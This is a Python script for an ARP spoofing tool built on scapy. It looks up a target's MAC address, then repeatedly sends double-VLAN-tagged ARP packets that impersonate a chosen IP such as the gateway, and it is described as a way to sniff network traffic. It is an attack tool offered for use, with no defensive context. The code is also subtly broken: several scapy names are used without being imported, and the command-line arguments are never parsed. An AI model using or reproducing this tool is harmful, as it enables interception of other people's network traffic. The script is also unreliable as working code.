import scapy.all as scapy
import questionary
import argparse
import sys


class ArpSpoofing:
    def __init__(self, target_ip, spoof_ip, interface):
        self.target_ip = target_ip
        self.spoof_ip = spoof_ip
        self.interface = interface

    def getMac(self, ip):
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request

        answered_list = scapy.srp(
            arp_request_broadcast,
            timeout=2,
            verbose=False,
            iface=self.interface,
        )[0]
        return answered_list[0][1].hwsrc if (answered_list) else None

    def StartSpoof(self):
        mac = self.getMac(self.target_ip)
        scapy.send(
            Ether(dst=mac)
            / Dot1Q(vlan=1)
            / Dot1Q(vlan=2)
            / ARP(op="who-has", psrc=self.spoof_ip, pdst=self.target_ip),
            inter=RandNum(10, 40),
            loop=1,
        )

    def run(self):
        self.StartSpoof()


if __name__ == "__main__":
    if len(sys.argv) > 1:
        parser = argparse.ArgumentParser(
            description="ARP Spoofing Tool to sniff network traffic."
        )

        target = parser.add_argument(
            "-t", "--target", required=True, help="Target IP address to spoof."
        )
        spoof = parser.add_argument(
            "-s",
            "--spoof",
            required=True,
            help="Spoofed IP address (e.g., the gateway IP).",
        )
        inter = parser.add_argument(
            "-i",
            "--interface",
            required=True,
            help="Network interface to use (e.g., eth0, wlan0).",
        )
    else:
        choices_all = [iface.name for iface in scapy.get_working_ifaces()]

        target = questionary.text("What's your target").ask()
        spoof = questionary.text("What's your gateway/ip to spoof").ask()
        inter = questionary.select("Select the interface", choices=choices_all).ask()
    ArpSpoofing(target_ip=target, spoof_ip=spoof, interface=inter).run()
